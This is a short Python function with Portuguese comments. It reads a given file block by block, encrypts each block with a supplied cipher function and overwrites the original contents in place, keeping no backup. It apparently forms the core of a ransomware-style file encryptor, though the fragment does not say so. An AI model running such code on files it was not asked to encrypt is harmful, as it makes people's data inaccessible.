def changeFiles(filename, cryptoFN, block_size=16):
    
    #Abrindo o arquivo que recebemos via parâmetro
    with open(filename, 'r+b') as _file:
        #Lendo pequenos blocos do arquivo
        rawValue = _file.read(block_size)
        while rawValue:
            #Cifrando pequenos valores do arquivo
            cipherValue = cryptoFN(rawValue)
            #Comparando o tamanho do valor cifrado
            if len(rawValue) != len(cipherValue):
                raise ValueError(f"O valor cifrado {len(cipherValue)} tem um tamanho diferente do valor plano {len(rawValue)}!")
            #Voltando o ponteiro de leitura para o inicio
            _file.seek(-len(rawValue), 1)
            #Escrevendo o valor cifrado
            _file.write(cipherValue)
            rawValue = _file.read(block_size)